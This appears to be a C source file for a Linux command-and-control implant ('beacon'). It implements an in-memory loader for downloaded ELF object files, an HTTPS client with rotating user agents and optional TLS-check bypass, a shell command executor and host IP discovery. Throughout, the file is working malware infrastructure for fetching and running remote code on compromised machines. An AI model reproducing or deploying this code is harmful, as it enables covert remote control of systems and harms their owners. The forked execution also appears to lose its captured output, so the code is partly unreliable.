/*
 * beacon_common.c - Shared beacon infrastructure implementation.
 *
 * This file contains the BOF loader, HTTP client, crypto wrappers,
 * output capture, and utility functions used by all beacon variants.
 * Centralizing this code eliminates duplication and ensures consistent
 * behavior across v1, v2, and v3 beacons.
 */
#define _GNU_SOURCE
#include "beacon_common.h"
#include "aes.h"
#include "cJSON.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <elf.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <stdarg.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <curl/curl.h>
#include <openssl/rand.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>
#include <openssl/hmac.h>

/* --- Global state --- */
char    *g_beacon_output = NULL;
size_t   g_output_len = 0;
size_t   g_output_capacity = 0;

void *g_printf_ptr = NULL;
void *g_strlen_ptr = NULL;
void *g_memcpy_ptr = NULL;
void *g_memset_ptr = NULL;
void *g_exit_ptr = NULL;
void *g_dlsym_ptr = NULL;
void *g_dlerror_ptr = NULL;
void *g_dlopen_ptr = NULL;
void *g_dlclose_ptr = NULL;
void *g_write_ptr = NULL;
void *g_mmap_ptr = NULL;
void *g_munmap_ptr = NULL;
void *g_BeaconPrintf_ptr = NULL;
void *g_BeaconOutput_ptr = NULL;
void *g_socket_ptr = NULL;
void *g_connect_ptr = NULL;
void *g_inet_addr_ptr = NULL;
void *g_htons_ptr = NULL;
void *g_send_ptr = NULL;
void *g_recv_ptr = NULL;
void *g_close_ptr = NULL;
void *g_getaddrinfo_ptr = NULL;
void *g_freeaddrinfo_ptr = NULL;

static Trampoline *g_trampolines = NULL;
static size_t g_trampolines_count = 0;
static size_t g_trampolines_capacity = 0;

static TrampolineCache *g_trampoline_cache = NULL;
static size_t g_cache_count = 0;
static size_t g_cache_capacity = 0;

static SymbolResolver g_external_symbols[] = {
    { "printf",         &g_printf_ptr },
    { "strlen",         &g_strlen_ptr },
    { "memcpy",         &g_memcpy_ptr },
    { "memset",         &g_memset_ptr },
    { "exit",           &g_exit_ptr },
    { "dlsym",          &g_dlsym_ptr },
    { "dlerror",        &g_dlerror_ptr },
    { "dlopen",         &g_dlopen_ptr },
    { "dlclose",        &g_dlclose_ptr },
    { "write",          &g_write_ptr },
    { "mmap",           &g_mmap_ptr },
    { "munmap",         &g_munmap_ptr },
    { "BeaconPrintf",   &g_BeaconPrintf_ptr },
    { "BeaconOutput",   &g_BeaconOutput_ptr },
    { "socket",         &g_socket_ptr },
    { "connect",        &g_connect_ptr },
    { "inet_addr",      &g_inet_addr_ptr },
    { "htons",          &g_htons_ptr },
    { "send",           &g_send_ptr },
    { "recv",           &g_recv_ptr },
    { "close",          &g_close_ptr },
    { "getaddrinfo",    &g_getaddrinfo_ptr },
    { "freeaddrinfo",   &g_freeaddrinfo_ptr },
    { NULL, NULL }
};

/* --- Output buffer management --- */
int bsb_output_init(size_t capacity) {
    if (capacity == 0) capacity = BSB_OUTPUT_BUFFER_DEFAULT;
    g_beacon_output = malloc(capacity);
    if (!g_beacon_output) return -1;
    g_output_capacity = capacity;
    g_output_len = 0;
    g_beacon_output[0] = '\0';
    return 0;
}

void bsb_output_cleanup(void) {
    free(g_beacon_output);
    g_beacon_output = NULL;
    g_output_capacity = 0;
    g_output_len = 0;
}

void bsb_output_reset(void) {
    if (g_beacon_output) {
        g_output_len = 0;
        g_beacon_output[0] = '\0';
    }
}

/* --- Beacon API (called by BOFs) --- */
void BeaconPrintf(int type, const char *fmt, ...) {
    (void)type;
    if (!g_beacon_output || g_output_len >= g_output_capacity - 1) return;
    va_list args;
    va_start(args, fmt);
    size_t remaining = g_output_capacity - g_output_len - 1;
    int written = vsnprintf(g_beacon_output + g_output_len, remaining, fmt, args);
    va_end(args);
    if (written > 0) {
        g_output_len += (size_t)written < remaining ? (size_t)written : remaining;
    }
}

void BeaconOutput(int type, const char *data, int len) {
    (void)type;
    if (!g_beacon_output || len <= 0 || !data) return;
    size_t remaining = g_output_capacity - g_output_len - 1;
    if ((size_t)len > remaining) {
        len = (int)remaining;
    }
    memcpy(g_beacon_output + g_output_len, data, len);
    g_output_len += len;
    g_beacon_output[g_output_len] = '\0';
}

/* --- Trampoline management --- */
void *create_trampoline(void *target) {
    if (!target) return NULL;
    size_t code_size = 12;
    void *code = mmap(NULL, code_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (code == MAP_FAILED) return NULL;

    uint8_t trampoline_code[] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xE0
    };
    *(uint64_t*)(trampoline_code + 2) = (uint64_t)target;
    memcpy(code, trampoline_code, code_size);

    if (g_trampolines_count >= g_trampolines_capacity) {
        size_t new_cap = g_trampolines_capacity ? g_trampolines_capacity * 2 : 4;
        Trampoline *tmp = realloc(g_trampolines, new_cap * sizeof(Trampoline));
        if (!tmp) {
            munmap(code, code_size);
            return NULL;
        }
        g_trampolines = tmp;
        g_trampolines_capacity = new_cap;
    }
    g_trampolines[g_trampolines_count].addr = code;
    g_trampolines[g_trampolines_count].size = code_size;
    g_trampolines_count++;
    return code;
}

void cleanup_trampolines(void) {
    for (size_t i = 0; i < g_trampolines_count; i++) {
        munmap(g_trampolines[i].addr, g_trampolines[i].size);
    }
    free(g_trampolines);
    g_trampolines = NULL;
    g_trampolines_count = 0;
    g_trampolines_capacity = 0;

    free(g_trampoline_cache);
    g_trampoline_cache = NULL;
    g_cache_count = 0;
    g_cache_capacity = 0;
}

void *get_or_create_trampoline(void *target) {
    if (!target) return NULL;
    for (size_t i = 0; i < g_cache_count; i++) {
        if (g_trampoline_cache[i].original == target) {
            return g_trampoline_cache[i].trampoline;
        }
    }
    void *tramp = create_trampoline(target);
    if (!tramp) return NULL;

    if (g_cache_count >= g_cache_capacity) {
        size_t new_cap = g_cache_capacity ? g_cache_capacity * 2 : 8;
        TrampolineCache *tmp = realloc(g_trampoline_cache, new_cap * sizeof(TrampolineCache));
        if (!tmp) return tramp;
        g_trampoline_cache = tmp;
        g_cache_capacity = new_cap;
    }
    g_trampoline_cache[g_cache_count].original = target;
    g_trampoline_cache[g_cache_count].trampoline = tramp;
    g_cache_count++;
    return tramp;
}

/* --- HTTP client --- */
struct MemoryStruct {
    char *memory;
    size_t size;
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) return 0;
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}

http_response_t https_request(const bsb_config_t *cfg, const char *url,
                               const char *method, const char *post_data) {
    http_response_t resp = {0};
    CURL *curl = curl_easy_init();
    if (!curl) return resp;

    struct MemoryStruct chunk = {0};
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, cfg->network.user_agents[rand() % cfg->network.count]);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, (long)cfg->network.verify_tls);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, (long)(cfg->network.verify_tls ? 2L : 0L));
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, (long)cfg->timing.curl_timeout_seconds);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, (long)cfg->timing.curl_connect_timeout_seconds);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");

    struct curl_slist *headers = NULL;
    if (strcmp(method, "POST") == 0) {
        size_t post_len = post_data ? strlen(post_data) : 0;
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        if (post_data) {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)post_len);
        } else {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, 0L);
        }
        headers = curl_slist_append(headers, "Content-Type: text/plain");
        headers = curl_slist_append(headers, "Expect:");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    }

    CURLcode res = curl_easy_perform(curl);
    if (headers) curl_slist_free_all(headers);

    if (res != CURLE_OK) {
        free(chunk.memory);
        curl_easy_cleanup(curl);
        return resp;
    }

    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    resp.status = (int)http_code;
    resp.data = chunk.memory;
    resp.len = chunk.size;
    curl_easy_cleanup(curl);
    return resp;
}

/* --- Base64 --- */
char *base64_encode(const unsigned char *input, int len) {
    BIO *b64 = BIO_new(BIO_f_base64());
    BIO *bmem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, bmem);
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO_write(b64, input, len);
    BIO_flush(b64);
    BUF_MEM *bptr;
    BIO_get_mem_ptr(b64, &bptr);
    char *buf = malloc(bptr->length + 1);
    memcpy(buf, bptr->data, bptr->length);
    buf[bptr->length] = '\0';
    BIO_free_all(b64);
    return buf;
}

unsigned char *base64_decode(const char *input, int *len) {
    int input_len = strlen(input);
    *len = 0;
    BIO *b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO *bmem = BIO_new_mem_buf(input, input_len);
    b64 = BIO_push(b64, bmem);
    unsigned char *buffer = malloc(input_len);
    if (!buffer) {
        BIO_free_all(b64);
        return NULL;
    }
    *len = BIO_read(b64, buffer, input_len);
    BIO_free_all(b64);
    if (*len <= 0) {
        free(buffer);
        return NULL;
    }
    return buffer;
}

/* --- URL encoding --- */
static int _is_unreserved(unsigned char c) {
    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
           (c >= '0' && c <= '9') || c == '-' || c == '_' ||
           c == '.' || c == '~';
}

char *url_encode(const char *in, size_t in_len, size_t *out_len) {
    char *out = malloc(in_len * 3 + 1);
    if (!out) return NULL;
    size_t j = 0;
    for (size_t i = 0; i < in_len; i++) {
        unsigned char c = (unsigned char)in[i];
        if (_is_unreserved(c)) {
            out[j++] = (char)c;
        } else {
            static const char hex[] = "0123456789ABCDEF";
            out[j++] = '%';
            out[j++] = hex[(c >> 4) & 0xF];
            out[j++] = hex[c & 0xF];
        }
    }
    out[j] = '\0';
    *out_len = j;
    return out;
}

/* AES-256-CFB wrappers are in aes_cfb.c */

/* --- Command execution --- */
char *exec_cmd(const char *cmd, int *out_len) {
    FILE *fp = popen(cmd, "r");
    if (!fp) return NULL;
    char *buffer = malloc(BSB_OUTPUT_BUFFER_DEFAULT);
    if (!buffer) {
        pclose(fp);
        return NULL;
    }
    size_t total = 0;
    size_t capacity = BSB_OUTPUT_BUFFER_DEFAULT;
    size_t n;
    while ((n = fread(buffer + total, 1, capacity - total - 1, fp)) > 0) {
        total += n;
        if (total >= capacity - 1) {
            capacity *= 2;
            char *tmp = realloc(buffer, capacity);
            if (!tmp) break;
            buffer = tmp;
        }
    }
    pclose(fp);
    buffer[total] = '\0';
    *out_len = (int)total;
    return buffer;
}

/* --- Backoff state --- */
void bsb_backoff_init(bsb_backoff_t *bo, int base, int max) {
    bo->current_seconds = base;
    bo->base_seconds = base;
    bo->max_seconds = max;
}

int bsb_backoff_next(bsb_backoff_t *bo) {
    int val = bo->current_seconds;
    bo->current_seconds *= 2;
    if (bo->current_seconds > bo->max_seconds) {
        bo->current_seconds = bo->max_seconds;
    }
    return val;
}

void bsb_backoff_reset(bsb_backoff_t *bo) {
    bo->current_seconds = bo->base_seconds;
}

/* --- IP discovery --- */
char *get_local_ips(void) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return strdup("127.0.0.1");
    struct ifconf ifc;
    char buf[1024];
    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sockfd, SIOCGIFCONF, &ifc) < 0) {
        close(sockfd);
        return strdup("127.0.0.1");
    }
    struct ifreq *ifr = ifc.ifc_req;
    int n = ifc.ifc_len / sizeof(struct ifreq);
    char *result = malloc(1024);
    result[0] = '\0';
    for (int i = 0; i < n; i++) {
        struct sockaddr_in *addr = (struct sockaddr_in*)&ifr[i].ifr_addr;
        if (addr->sin_family == AF_INET && strcmp(ifr[i].ifr_name, "lo") != 0) {
            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);
            if (strlen(result) > 0) strcat(result, ", ");
            strcat(result, ip);
        }
    }
    close(sockfd);
    return strlen(result) > 0 ? result : strdup("127.0.0.1");
}

/* --- BOF download --- */
unsigned char *download_bof(const bsb_config_t *cfg, const char *url, size_t *out_size) {
    http_response_t resp = https_request(cfg, url, "GET", NULL);
    if (!resp.data || resp.len == 0) {
        *out_size = 0;
        free(resp.data);
        return NULL;
    }
    *out_size = resp.len;
    return (unsigned char *)resp.data;
}

/* --- BOF execution with fork isolation --- */
static void init_function_pointers(void) {
    if (!g_BeaconPrintf_ptr) g_BeaconPrintf_ptr = (void*)BeaconPrintf;
    if (!g_BeaconOutput_ptr) g_BeaconOutput_ptr = (void*)BeaconOutput;
    if (!g_mmap_ptr) g_mmap_ptr = (void*)mmap;
    if (!g_munmap_ptr) g_munmap_ptr = (void*)munmap;
    if (!g_write_ptr) g_write_ptr = (void*)write;
    if (!g_printf_ptr) g_printf_ptr = (void*)printf;
    if (!g_memcpy_ptr) g_memcpy_ptr = (void*)memcpy;
    if (!g_memset_ptr) g_memset_ptr = (void*)memset;
    if (!g_strlen_ptr) g_strlen_ptr = (void*)strlen;
    if (!g_socket_ptr) g_socket_ptr = (void*)socket;
    if (!g_connect_ptr) g_connect_ptr = (void*)connect;
    if (!g_close_ptr) g_close_ptr = (void*)close;
    if (!g_getaddrinfo_ptr) g_getaddrinfo_ptr = (void*)getaddrinfo;
    if (!g_freeaddrinfo_ptr) g_freeaddrinfo_ptr = (void*)freeaddrinfo;
    if (!g_send_ptr) g_send_ptr = (void*)send;
    if (!g_recv_ptr) g_recv_ptr = (void*)recv;
    if (!g_htons_ptr) g_htons_ptr = (void*)htons;
    if (!g_inet_addr_ptr) g_inet_addr_ptr = (void*)inet_addr;
    if (!g_exit_ptr) g_exit_ptr = (void*)exit;
    if (!g_dlsym_ptr) g_dlsym_ptr = (void*)dlsym;
    if (!g_dlerror_ptr) g_dlerror_ptr = (void*)dlerror;
    if (!g_dlopen_ptr) g_dlopen_ptr = (void*)dlopen;
    if (!g_dlclose_ptr) g_dlclose_ptr = (void*)dlclose;
}

static size_t page_align(size_t size) {
    long page_size = sysconf(_SC_PAGESIZE);
    if (page_size <= 0) page_size = 4096;
    return (size + page_size - 1) & ~(page_size - 1);
}

static void __attribute__((noinline)) call_bof_isolated(bof_func_t func, char *args, uintptr_t arglen) {
    asm volatile(
        "push %%rbp\n\t"
        "mov %%rsp, %%rbp\n\t"
        "push %%rbx\n\t"
        "push %%r12\n\t"
        "push %%r13\n\t"
        "push %%r14\n\t"
        "push %%r15\n\t"
        "sub $8, %%rsp\n\t"
        "mov %0, %%rdi\n\t"
        "mov %1, %%rsi\n\t"
        "xor %%eax, %%eax\n\t"
        "call *%2\n\t"
        "add $8, %%rsp\n\t"
        "pop %%r15\n\t"
        "pop %%r14\n\t"
        "pop %%r13\n\t"
        "pop %%r12\n\t"
        "pop %%rbx\n\t"
        "pop %%rbp\n\t"
        :
        : "r"(args), "r"(arglen), "r"(func)
        : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11",
          "xmm0", "xmm1", "xmm2", "xmm3", "xmm4", "xmm5", "xmm6", "xmm7",
          "memory", "cc"
    );
}

int RunELF(const char *functionname, unsigned char *elf_data, uint32_t filesize,
           unsigned char *argumentdata, int argumentSize) {
    init_function_pointers();
    bsb_output_reset();

    if (!elf_data || filesize < sizeof(Elf64_Ehdr)) return -1;

    Elf64_Ehdr *ehdr = (Elf64_Ehdr*)elf_data;
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) return -1;
    if (ehdr->e_machine != EM_X86_64) return -1;
    if (ehdr->e_shoff == 0 || ehdr->e_shnum == 0) return -1;

    Elf64_Shdr *shdr = (Elf64_Shdr*)(elf_data + ehdr->e_shoff);
    char *strtab = NULL;
    Elf64_Sym *symtab = NULL;

    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdr[i].sh_type == SHT_SYMTAB) {
            symtab = (Elf64_Sym*)(elf_data + shdr[i].sh_offset);
            if (shdr[i].sh_link < ehdr->e_shnum) {
                strtab = (char*)(elf_data + shdr[shdr[i].sh_link].sh_offset);
            }
            break;
        }
    }
    if (!symtab || !strtab) return -1;

    int sym_table_count = 0;
    for (int k = 0; k < ehdr->e_shnum; k++) {
        if (shdr[k].sh_type == SHT_SYMTAB) {
            sym_table_count = shdr[k].sh_size / sizeof(Elf64_Sym);
            break;
        }
    }

    for (int i = 0; i < ehdr->e_shnum; i++) {
        Elf64_Shdr *sh = &shdr[i];
        if (sh->sh_type != SHT_RELA) continue;
        Elf64_Rela *rela = (Elf64_Rela*)(elf_data + sh->sh_offset);
        int num_rela = sh->sh_size / sizeof(Elf64_Rela);
        for (int j = 0; j < num_rela; j++) {
            int sym_idx = ELF64_R_SYM(rela[j].r_info);
            if (sym_idx == 0 || sym_idx >= sym_table_count) continue;
            Elf64_Sym *sym = &symtab[sym_idx];
            if (sym->st_shndx != SHN_UNDEF) continue;
            char *sym_name = strtab + sym->st_name;
            if (!sym_name || sym_name[0] == '\0') continue;
            void *resolved = NULL;
            for (int k = 0; g_external_symbols[k].name; k++) {
                if (strcmp(sym_name, g_external_symbols[k].name) == 0) {
                    if (*g_external_symbols[k].ptr == NULL) {
                        *g_external_symbols[k].ptr = dlsym(RTLD_DEFAULT, sym_name);
                    }
                    resolved = *g_external_symbols[k].ptr;
                    break;
                }
            }
            if (!resolved) {
                void *auto_resolved = dlsym(RTLD_DEFAULT, sym_name);
                if (auto_resolved) resolved = auto_resolved;
            }
        }
    }

    void **sections = calloc(ehdr->e_shnum, sizeof(void*));
    size_t *aligned_sizes = calloc(ehdr->e_shnum, sizeof(size_t));
    if (!sections || !aligned_sizes) {
        free(sections);
        free(aligned_sizes);
        return -1;
    }

    for (int i = 0; i < ehdr->e_shnum; i++) {
        Elf64_Shdr *sh = &shdr[i];
        if ((sh->sh_flags & SHF_ALLOC) && sh->sh_size > 0) {
            if (sh->sh_type == SHT_PROGBITS) {
                if (sh->sh_offset + sh->sh_size > filesize) continue;
            }
            size_t aligned_size = page_align(sh->sh_size);
            void *addr = mmap(NULL, aligned_size, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (addr == MAP_FAILED) continue;
            sections[i] = addr;
            aligned_sizes[i] = aligned_size;
            if (sh->sh_type == SHT_PROGBITS) {
                memcpy(addr, elf_data + sh->sh_offset, sh->sh_size);
            } else if (sh->sh_type == SHT_NOBITS) {
                memset(addr, 0, aligned_size);
            }
        }
    }

    for (int i = 0; i < ehdr->e_shnum; i++) {
        Elf64_Shdr *sh = &shdr[i];
        if (sh->sh_type != SHT_RELA) continue;
        int target_sec = sh->sh_info;
        if (target_sec >= ehdr->e_shnum || !sections[target_sec]) continue;
        if (!(shdr[target_sec].sh_flags & SHF_ALLOC)) continue;
        Elf64_Rela *rela = (Elf64_Rela*)(elf_data + sh->sh_offset);
        int num_rela = sh->sh_size / sizeof(Elf64_Rela);
        void *target_addr = sections[target_sec];
        for (int j = 0; j < num_rela; j++) {
            Elf64_Rela *r = &rela[j];
            void *loc = (char*)target_addr + r->r_offset;
            int sym_idx = ELF64_R_SYM(r->r_info);
            if (sym_idx >= sym_table_count) continue;
            Elf64_Sym *sym = &symtab[sym_idx];
            char *sym_name = strtab + sym->st_name;
            void *symbol_addr = NULL;
            if (sym->st_shndx != SHN_UNDEF && sym->st_shndx < ehdr->e_shnum && sections[sym->st_shndx]) {
                symbol_addr = sections[sym->st_shndx] + sym->st_value;
            } else {
                for (int k = 0; g_external_symbols[k].name; k++) {
                    if (strcmp(sym_name, g_external_symbols[k].name) == 0) {
                        symbol_addr = *g_external_symbols[k].ptr;
                        break;
                    }
                }
            }
            if (!symbol_addr) continue;

            switch (ELF64_R_TYPE(r->r_info)) {
                case R_X86_64_64:
                    *(uint64_t*)loc = (uint64_t)((uintptr_t)symbol_addr + r->r_addend);
                    break;
                case R_X86_64_32: {
                    uintptr_t value = (uintptr_t)symbol_addr + r->r_addend;
                    if (value > 0xFFFFFFFF) continue;
                    *(uint32_t*)loc = (uint32_t)value;
                    break;
                }
                case R_X86_64_32S: {
                    intptr_t value = (intptr_t)symbol_addr + r->r_addend;
                    if (value < INT32_MIN || value > INT32_MAX) goto cleanup;
                    *(int32_t*)loc = (int32_t)value;
                    break;
                }
                case R_X86_64_PC32:
                case R_X86_64_PLT32: {
                    int64_t offset = (int64_t)symbol_addr + r->r_addend - (int64_t)loc;
                    if (offset < INT32_MIN || offset > INT32_MAX) {
                        void *trampoline = get_or_create_trampoline(symbol_addr);
                        if (!trampoline) continue;
                        offset = (int64_t)trampoline + r->r_addend - (int64_t)loc;
                        if (offset < INT32_MIN || offset > INT32_MAX) continue;
                    }
                    *(uint32_t*)loc = (uint32_t)offset;
                    break;
                }
            }
        }
    }

    bof_func_t entry = NULL;
    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdr[i].sh_type == SHT_SYMTAB) {
            int sym_count = shdr[i].sh_size / sizeof(Elf64_Sym);
            for (int j = 0; j < sym_count; j++) {
                Elf64_Sym *sym = &symtab[j];
                if (sym->st_name == 0) continue;
                char *name = strtab + sym->st_name;
                if (strcmp(name, functionname) == 0 && sym->st_shndx != SHN_UNDEF) {
                    if (sym->st_shndx < ehdr->e_shnum && sections[sym->st_shndx]) {
                        entry = (bof_func_t)(sections[sym->st_shndx] + sym->st_value);
                        break;
                    }
                }
            }
        }
    }

    if (!entry) goto cleanup;

    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (sections[i]) {
            if (mprotect(sections[i], aligned_sizes[i], PROT_READ | PROT_EXEC) != 0) {
                goto cleanup;
            }
        }
    }

    pid_t pid = fork();
    if (pid < 0) {
        call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);
    } else if (pid == 0) {
        call_bof_isolated(entry, (char*)argumentdata, (uintptr_t)argumentSize);
        _exit(0);
    } else {
        int status;
        waitpid(pid, &status, 0);
    }

cleanup:
    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (sections[i]) {
            munmap(sections[i], aligned_sizes[i]);
        }
    }
    free(sections);
    free(aligned_sizes);
    cleanup_trampolines();
    return (entry != NULL) ? 0 : -1;
}

char *run_bof_and_capture(unsigned char *elf_data, uint32_t filesize,
                           char *args, int arglen, int *out_len) {
    bsb_output_reset();
    RunELF("go", elf_data, filesize, (unsigned char*)args, arglen);
    if (g_output_len == 0) {
        *out_len = 0;
        return strdup("");
    }
    char *output = malloc(g_output_len + 1);
    if (!output) {
        *out_len = 0;
        return strdup("");
    }
    memcpy(output, g_beacon_output, g_output_len);
    output[g_output_len] = '\0';
    *out_len = (int)g_output_len;
    return output;
}
